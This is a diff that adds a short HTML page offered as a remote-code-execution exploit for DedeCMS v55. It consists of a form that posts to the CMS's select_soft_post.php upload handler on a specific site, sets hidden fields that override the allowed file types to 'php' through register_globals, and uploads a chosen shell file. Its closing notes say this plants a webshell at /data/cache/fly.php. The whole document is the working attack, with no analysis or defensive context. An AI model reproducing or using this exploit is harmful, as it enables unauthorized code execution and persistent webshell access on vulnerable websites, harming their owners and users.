@@ -1,0 +1,26 @@
+<html>
+<head>
+<title>Dedecms v55 RCE Exploit Codz By digua</title>
+</head>
+<body style="FONT-SIZE: 9pt">
+---------- Dedecms v55 RCE Exploit Codz By digua---------- <br /><br />
+<form action=http://www.3800q.com/include/dialog/select_soft_post.php method='POST'
+
+enctype="multipart/form-data" name='myform'>
+<input type='hidden' name='activepath' value='/data/cache/' />
+<input type='hidden' name='cfg_basedir' value='../../' />
+<input type='hidden' name='cfg_imgtype' value='php' />
+<input type='hidden' name='cfg_not_allowall' value='txt' />
+<input type='hidden' name='cfg_softtype' value='php' />
+<input type='hidden' name='cfg_mediatype' value='php' />
+<input type='hidden' name='f' value='form1.enclosure' />
+<input type='hidden' name='job' value='upload' />
+<input type='hidden' name='newname' value='fly.php' />
+Select U Shell <input type='file' name='uploadfile' size='25' />
+<input type='submit' name='sb1' value='È·¶¨' />
+</form>
+<br />It's just a exp for the bug of Dedecms V55...<br />
+Need register_globals = on...<br />
+Fun the game,get a webshell at /data/cache/fly.php...<br />
+</body>
+</html>
